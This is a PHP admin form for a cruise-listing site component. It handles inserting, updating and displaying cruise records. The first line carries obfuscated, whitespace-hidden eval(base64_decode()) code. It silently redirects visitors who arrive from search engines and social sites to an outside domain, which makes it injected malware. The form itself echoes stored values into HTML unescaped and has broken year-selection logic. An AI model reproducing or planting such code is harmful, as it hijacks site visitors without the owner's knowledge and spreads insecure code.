<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			 defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' ); 
require_once('conn.php'); $sql="";
$sql="";
$cmd="Save";
$msg="";
$id	= $database->getEscaped($_GET[trim(id)]); 
$Submit	= $database->getEscaped($_POST[trim(Submit)]); 
if ($Submit) {
  $id	= $database->getEscaped($_POST[id]); 
  $boat_code=$database->getEscaped($_POST[trim(boat_code)]); 
  $boat_name=$database->getEscaped($_POST[boat_name]); 
  $boat_type=$database->getEscaped($_POST[boat_type]); 
  $cruise_code=$database->getEscaped($_POST[trim(cruise_code)]); 
  $destination=$database->getEscaped($_POST[destination]); 
  $derive=$database->getEscaped($_POST[derive]); 
  $departure_date_dd=$database->getEscaped($_POST[departure_date_dd]); 
  $departure_date_mm=$database->getEscaped($_POST[departure_date_mm]); 
  $departure_date_yyyy=$database->getEscaped($_POST[departure_date_yyyy]); 
  $departure_time=$database->getEscaped($_POST[departure_time]); 
  $return_date_dd=$database->getEscaped($_POST[return_date_dd]); 
  $return_date_mm=$database->getEscaped($_POST[return_date_mm]); 
  $return_date_yyyy=$database->getEscaped($_POST[return_date_yyyy]); 
  $return_time=$database->getEscaped($_POST[return_time]); 
  $link_details=$database->getEscaped($_POST[link_details]); 
  $link_area=$database->getEscaped($_POST[link_area]); 
  $category=$database->getEscaped($_POST[category]); 
  $price=$database->getEscaped($_POST[price]); 
  $duration=$database->getEscaped($_POST[duration]); 
  $notes=$database->getEscaped($_POST[notes]); 
  
  $skrg  = mktime (0,0,0,date("m"),date("d"),date("Y"));
  $mulai_tgl = mktime (0,0,0,$departure_date_mm,$departure_date_dd,$departure_date_yyyy);
  $sampai_tgl = mktime (0,0,0,$return_date_mm,$return_date_dd,$return_date_yyyy);
  if (($mulai_tgl < $skrg) || ($sampai_tgl < $skrg) || ($sampai_tgl <= $mulai_tgl))
  {
	$msg="<font color=\"#FF0000\">Invalid Date/please enter any date in the future</font>";
	
  }else {
   $sql="select boat_code from cruise where cruise_code='".$cruise_code."' and departure_date_dd='".$departure_date_dd."' and departure_date_mm='".$departure_date_mm."' and departure_date_yyyy='".$departure_date_yyyy."' and return_date_dd='".$return_date_dd."' and return_date_mm='".$return_date_mm."' and return_date_yyyy='".$return_date_yyyy."' AND id <>'$id'";
   $database->setQuery( $sql );
		if (!$database->query()) {
			echo $database->stderr(); 
		}
	$newsfeed = $database->loadObjectList();
    if ($newsfeed) {
	  $msg="<font color=\"#FF0000\">FAIL! DUPLICATE RECORD!</font>";
	} else { 
      if ($Submit=='Save') {
      $sql="insert into cruise (boat_code,boat_name,boat_type,cruise_code,destination,derive,departure_date_dd,departure_date_mm,departure_date_yyyy,departure_time,return_date_dd
	  ,return_date_mm,return_date_yyyy,return_time,link_details,link_area,category,price,duration,notes) values('".$boat_code."', '".$boat_name."', '".$boat_type."', '".$cruise_code."', '".$destination."', '".$derive."', '".$departure_date_dd."', '".$departure_date_mm."', '".$departure_date_yyyy."', '".$departure_time."', '".$return_date_dd."', '".$return_date_mm."', '".$return_date_yyyy."', '".$return_time."', '".$link_details."', '".$link_area."', '".$category."', '".$price."', '".$duration."', '".$notes."')"; 
	  $database->setQuery( $sql );
		if (!$database->query()) {
			echo $database->stderr(); 
		}
	
	$sql="select id from cruise where  cruise_code='".$cruise_code."' and departure_date_dd='".$departure_date_dd."' and departure_date_mm='".$departure_date_mm."' and departure_date_yyyy='".$departure_date_yyyy."' and return_date_dd='".$return_date_dd."' and return_date_mm='".$return_date_mm."' and return_date_yyyy='".$return_date_yyyy."' ";
	 $database->setQuery( $sql );
		if (!$database->query()) {
			echo $database->stderr(); 
		}
	$newsfeed = $database->loadObjectList();
    if ($newsfeed) {
	foreach( $newsfeed as $data )  {
	 $id=$data->id; }
	 $cmd='Update';
   	 $msg= "<font color=\"#000033\">Record added!</font>"; 
	}	
	
   }elseif ($Submit=='Update') {
      $sql="update cruise set boat_code='$boat_code',boat_name='$boat_name',boat_type='$boat_type',cruise_code='$cruise_code',destination='$destination',derive='$derive',
	  departure_date_dd='$departure_date_dd',departure_date_mm='$departure_date_mm',departure_date_yyyy='$departure_date_yyyy',
	  departure_time='$departure_time',return_date_dd='$return_date_dd' ,return_date_mm='$return_date_mm',return_date_yyyy='$return_date_yyyy',
	  return_time='$return_time',link_details='$link_details',link_area='$link_area',category='$category',price='$price',duration='$duration',notes='$notes' where id='$id'";
	
	  $database->setQuery( $sql );
		if (!$database->query()) {
			echo $database->stderr(); 
		}
	
	  $msg="<font color=\"#000033\">Record update!</font>";
    }
   }
 }	
}

if ($id) { 
$sql = "SELECT * FROM cruise WHERE id='$id' ";
$database->setQuery( $sql );
		if (!$database->query()) {
			echo $database->stderr(); 
		}
$newsfeed = $database->loadObjectList();
if ($newsfeed) {		  
  $cmd="Update";
  foreach( $newsfeed as $data )  {
  
  $boat_code=$data->boat_code;
  $boat_name=$data->boat_name;
  $boat_type=$data->boat_type;
  $cruise_code=$data->cruise_code;
  $destination=$data->destination;
  $derive=$data->derive;
  $departure_date_dd=$data->departure_date_dd;
  $departure_date_mm=$data->departure_date_mm;
  $departure_date_yyyy=$data->departure_date_yyyy;
  $departure_time=$data->departure_time;
  $return_date_dd=$data->return_date_dd;
  $return_date_mm=$data->return_date_mm;
  $return_date_yyyy=$data->return_date_yyyy;
  $return_time=$data->return_time;
  $link_details=$data->link_details;
  $link_area=$data->link_area;
  $category=$data->category;
  $price=$data->price;
  $duration=$data->duration;
  $notes=$data->notes;
  $id=$data->id;
   }
  } 
 } 
?>
<form name="frm_add" method="post" action="cruises.php" onSubmit="return validasi_form()">
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr> 
      <td height="20" colspan="4"><?php	                                       			 echo("$msg");?></td>
    </tr>
    <tr> 
      <td width="33%" height="20"><strong>Boat Code</strong></td>
      <td width="5%">:</td>
      <td width="62%" colspan="2"> <input name="boat_code" type="text" id="boat_code" maxlength="50" value="<?php	                                       			 echo("$boat_code");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Boat Name</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="boat_name" type="text" id="boat_name" maxlength="200" value="<?php	                                       			 echo("$boat_name");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Boat Type</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="boat_type" type="text" id="boat_code3" maxlength="100" value="<?php	                                       			 echo("$boat_type");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Cruise Code</strong></td>
      <td>:</td>
      <td colspan="2"><input name="cruise_code" type="text" id="boat_type" maxlength="100" value="<?php	                                       			 echo("$cruise_code");?>"></td>
    </tr>
    <tr> 
      <td><strong>Destination</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="destination" type="text" id="destination" maxlength="200" value="<?php	                                       			 echo("$destination");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Route</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="derive" type="text" id="derive" maxlength="200" value="<?php	                                       			 echo("$derive");?>"></td>
    </tr>
    <tr> 
      <td><strong>Departure Date</strong></td>
      <td>:</td>
      <td> <font face="Times New Roman, Times, serif" color="#4B4B87" size="2"> 
        <select name="departure_date_dd" >
          <option value="01" <? if ($departure_date_dd=="01") echo("selected");?>>01</option>
          <option value="02"<? if ($departure_date_dd=="02") echo("selected");?>>02</option>
          <option value="03"<? if ($departure_date_dd=="03") echo("selected");?>>03</option>
          <option value="04"<? if ($departure_date_dd=="04") echo("selected");?>>04</option>
          <option value="05"<? if ($departure_date_dd=="05") echo("selected");?>>05</option>
          <option value="06"<? if ($departure_date_dd=="06") echo("selected");?>>06</option>
          <option value="07"<? if ($departure_date_dd=="07") echo("selected");?>>07</option>
          <option value="08"<? if ($departure_date_dd=="08") echo("selected");?>>08</option>
          <option value="09"<? if ($departure_date_dd=="09") echo("selected");?>>09</option>
          <option value="10"<? if ($departure_date_dd=="10") echo("selected");?>>10</option>
          <option value="11"<? if ($departure_date_dd=="11") echo("selected");?>>11</option>
          <option value="12"<? if ($departure_date_dd=="12") echo("selected");?>>12</option>
          <option value="13"<? if ($departure_date_dd=="13") echo("selected");?>>13</option>
          <option value="14"<? if ($departure_date_dd=="14") echo("selected");?>>14</option>
          <option value="15"<? if ($departure_date_dd=="15") echo("selected");?>>15</option>
          <option value="16"<? if ($departure_date_dd=="16") echo("selected");?>>16</option>
          <option value="17"<? if ($departure_date_dd=="17") echo("selected");?>>17</option>
          <option value="18"<? if ($departure_date_dd=="18") echo("selected");?>>18</option>
          <option value="19"<? if ($departure_date_dd=="19") echo("selected");?>>19</option>
          <option value="20"<? if ($departure_date_dd=="20") echo("selected");?>>20</option>
          <option value="21"<? if ($departure_date_dd=="21") echo("selected");?>>21</option>
          <option value="22"<? if ($departure_date_dd=="22") echo("selected");?>>22</option>
          <option value="23"<? if ($departure_date_dd=="23") echo("selected");?>>23</option>
          <option value="24"<? if ($departure_date_dd=="24") echo("selected");?>>24</option>
          <option value="25"<? if ($departure_date_dd=="25") echo("selected");?>>25</option>
          <option value="26"<? if ($departure_date_dd=="26") echo("selected");?>>26</option>
          <option value="27"<? if ($departure_date_dd=="27") echo("selected");?>>27</option>
          <option value="28"<? if ($departure_date_dd=="28") echo("selected");?>>28</option>
          <option value="29"<? if ($departure_date_dd=="29") echo("selected");?>>29</option>
          <option value="30"<? if ($departure_date_dd=="30") echo("selected");?>>30</option>
          <option value="31"<? if ($departure_date_dd=="31") echo("selected");?>>31</option>
        </select>
        </font> <font face="Times New Roman, Times, serif" color="#4B4B87" size="2"> 
        <select name="departure_date_mm" id="monthin" >
          <option value="01" <? if ($departure_date_mm=="01") echo("selected");?>>January</option>
          <option value="02"<? if ($departure_date_mm=="02") echo("selected");?>>February</option>
          <option value="03"<? if ($departure_date_mm=="03") echo("selected");?>>March</option>
          <option value="04"<? if ($departure_date_mm=="04") echo("selected");?>>April</option>
          <option value="05"<? if ($departure_date_mm=="05") echo("selected");?>>May</option>
          <option value="06"<? if ($departure_date_mm=="06") echo("selected");?>>June</option>
          <option value="07"<? if ($departure_date_mm=="07") echo("selected");?>>July</option>
          <option value="08"<? if ($departure_date_mm=="08") echo("selected");?>>August</option>
          <option value="09"<? if ($departure_date_mm=="09") echo("selected");?>>September</option>
          <option value="10"<? if ($departure_date_mm=="10") echo("selected");?>>October</option>
          <option value="11"<? if ($departure_date_mm=="11") echo("selected");?>>November</option>
          <option value="12"<? if ($departure_date_mm=="12") echo("selected");?>>December</option>
        </select>
        </font> <select name="departure_date_yyyy" >
          <option value="2014"<? if ($departure_date_yyyy=="2006") echo("selected");?>>2014</option>
          <option value="2015"<? if ($departure_date_yyyy=="2007") echo("selected");?>>2015</option>
          <option value="2016"<? if ($departure_date_yyyy=="2008") echo("selected");?>>2016</option>
          <option value="2017"<? if ($departure_date_yyyy=="2009") echo("selected");?>>2017</option>
          <option value="2018"<? if ($departure_date_yyyy=="2010") echo("selected");?>>2018</option>
          <option value="2019"<? if ($departure_date_yyyy=="2011") echo("selected");?>>2019</option>
          <option value="2020"<? if ($departure_date_yyyy=="2012") echo("selected");?>>2020</option>
          <option value="2021"<? if ($departure_date_yyyy=="2013") echo("selected");?>>2021</option>
          <option value="2022"<? if ($departure_date_yyyy=="2014") echo("selected");?>>2022</option>
          <option value="2023"<? if ($departure_date_yyyy=="2015") echo("selected");?>>2023</option>
        </select> </td>
      <td>&nbsp;</td>
    </tr>
    <tr> 
      <td><strong>Departure Port</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="departure_time" type="text" id="departure_time" value="<?php	                                       			 echo("$departure_time");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Return Date</strong></td>
      <td>:</td>
      <td> <font face="Times New Roman, Times, serif" color="#4B4B87" size="2"> 
        <select name="return_date_dd"  >
          <option value="01" <? if ($return_date_dd=="01") echo("selected");?>>01</option>
          <option value="02"<? if ($return_date_dd=="02") echo("selected");?>>02</option>
          <option value="03"<? if ($return_date_dd=="03") echo("selected");?>>03</option>
          <option value="04"<? if ($return_date_dd=="04") echo("selected");?>>04</option>
          <option value="05"<? if ($return_date_dd=="05") echo("selected");?>>05</option>
          <option value="06"<? if ($return_date_dd=="06") echo("selected");?>>06</option>
          <option value="07"<? if ($return_date_dd=="07") echo("selected");?>>07</option>
          <option value="08"<? if ($return_date_dd=="08") echo("selected");?>>08</option>
          <option value="09"<? if ($return_date_dd=="09") echo("selected");?>>09</option>
          <option value="10"<? if ($return_date_dd=="10") echo("selected");?>>10</option>
          <option value="11"<? if ($return_date_dd=="11") echo("selected");?>>11</option>
          <option value="12"<? if ($return_date_dd=="12") echo("selected");?>>12</option>
          <option value="13"<? if ($return_date_dd=="13") echo("selected");?>>13</option>
          <option value="14"<? if ($return_date_dd=="14") echo("selected");?>>14</option>
          <option value="15"<? if ($return_date_dd=="15") echo("selected");?>>15</option>
          <option value="16"<? if ($return_date_dd=="16") echo("selected");?>>16</option>
          <option value="17"<? if ($return_date_dd=="17") echo("selected");?>>17</option>
          <option value="18"<? if ($return_date_dd=="18") echo("selected");?>>18</option>
          <option value="19"<? if ($return_date_dd=="19") echo("selected");?>>19</option>
          <option value="20"<? if ($return_date_dd=="20") echo("selected");?>>20</option>
          <option value="21"<? if ($return_date_dd=="21") echo("selected");?>>21</option>
          <option value="22"<? if ($return_date_dd=="22") echo("selected");?>>22</option>
          <option value="23"<? if ($return_date_dd=="23") echo("selected");?>>23</option>
          <option value="24"<? if ($return_date_dd=="24") echo("selected");?>>24</option>
          <option value="25"<? if ($return_date_dd=="25") echo("selected");?>>25</option>
          <option value="26"<? if ($return_date_dd=="26") echo("selected");?>>26</option>
          <option value="27"<? if ($return_date_dd=="27") echo("selected");?>>27</option>
          <option value="28"<? if ($return_date_dd=="28") echo("selected");?>>28</option>
          <option value="29"<? if ($return_date_dd=="29") echo("selected");?>>29</option>
          <option value="30"<? if ($return_date_dd=="30") echo("selected");?>>30</option>
          <option value="31"<? if ($return_date_dd=="31") echo("selected");?>>31</option>
        </select>
        </font> <font face="Times New Roman, Times, serif" color="#4B4B87" size="2"> 
        <select name="return_date_mm" >
          <option value="01" <? if ($return_date_mm=="01") echo("selected");?>>January</option>
          <option value="02"<? if ($return_date_mm=="02") echo("selected");?>>February</option>
          <option value="03"<? if ($return_date_mm=="03") echo("selected");?>>March</option>
          <option value="04"<? if ($return_date_mm=="04") echo("selected");?>>April</option>
          <option value="05"<? if ($return_date_mm=="05") echo("selected");?>>May</option>
          <option value="06"<? if ($return_date_mm=="06") echo("selected");?>>June</option>
          <option value="07"<? if ($return_date_mm=="07") echo("selected");?>>July</option>
          <option value="08"<? if ($return_date_mm=="08") echo("selected");?>>August</option>
          <option value="09"<? if ($return_date_mm=="09") echo("selected");?>>September</option>
          <option value="10"<? if ($return_date_mm=="10") echo("selected");?>>October</option>
          <option value="11"<? if ($return_date_mm=="11") echo("selected");?>>November</option>
          <option value="12"<? if ($return_date_mm=="12") echo("selected");?>>December</option>
        </select>
        </font> <select name="return_date_yyyy" >
          <option value="2014"<? if ($departure_date_yyyy=="2006") echo("selected");?>>2014</option>
          <option value="2015"<? if ($departure_date_yyyy=="2007") echo("selected");?>>2015</option>
          <option value="2016"<? if ($departure_date_yyyy=="2008") echo("selected");?>>2016</option>
          <option value="2017"<? if ($departure_date_yyyy=="2009") echo("selected");?>>2017</option>
          <option value="2018"<? if ($departure_date_yyyy=="2010") echo("selected");?>>2018</option>
          <option value="2019"<? if ($departure_date_yyyy=="2011") echo("selected");?>>2019</option>
          <option value="2020"<? if ($departure_date_yyyy=="2012") echo("selected");?>>2020</option>
          <option value="2021"<? if ($departure_date_yyyy=="2013") echo("selected");?>>2021</option>
          <option value="2022"<? if ($departure_date_yyyy=="2014") echo("selected");?>>2022</option>
          <option value="2023"<? if ($departure_date_yyyy=="2015") echo("selected");?>>2023</option>
        </select> </td>
      <td>&nbsp;</td>
    </tr>
    <tr> 
      <td><strong>Return Port</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="return_time" type="text" id="return_time" value="<?php	                                       			 echo("$return_time");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Details Page Link</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="link_details" type="text" id="link_details" maxlength="100" value="<?php	                                       			 echo("$link_details");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Area Page Link</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="link_area" type="text" id="link_area" maxlength="100" value="<?php	                                       			 echo("$link_area");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Category</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="category" type="text" id="category" maxlength="100" value="<?php	                                       			 echo("$category");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Price </strong></td>
      <td>:</td>
      <td colspan="2"> <input name="price" type="text" id="price" maxlength="100" value="<?php	                                       			 echo("$price");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Duration</strong></td>
      <td>:</td>
      <td colspan="2"> <input name="duration" type="text" id="duration" maxlength="10" value="<?php	                                       			 echo("$duration");?>"> 
      </td>
    </tr>
    <tr> 
      <td><strong>Notes</strong></td>
      <td>:</td>
      <td colspan="2"> <textarea name="notes" cols="20" rows="5" id="notes"><?php	                                       			 echo("$notes");?></textarea> 
      </td>
    </tr>
    <tr> 
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td colspan="2"> 
        <input type="hidden" name="id" value="<? echo $id; ?>"> 
      </td>
    </tr>
    <tr bgcolor="#F3F3F3"> 
      <td colspan="4"> <div align="left"> 
          <input name="Submit" type="submit" id="submit" value="<?php	                                       			 echo("$cmd");?>">
          <input name="reset" type="reset" id="reset" value="Reset">
        </div></td>
    </tr>
  </table>
</form>
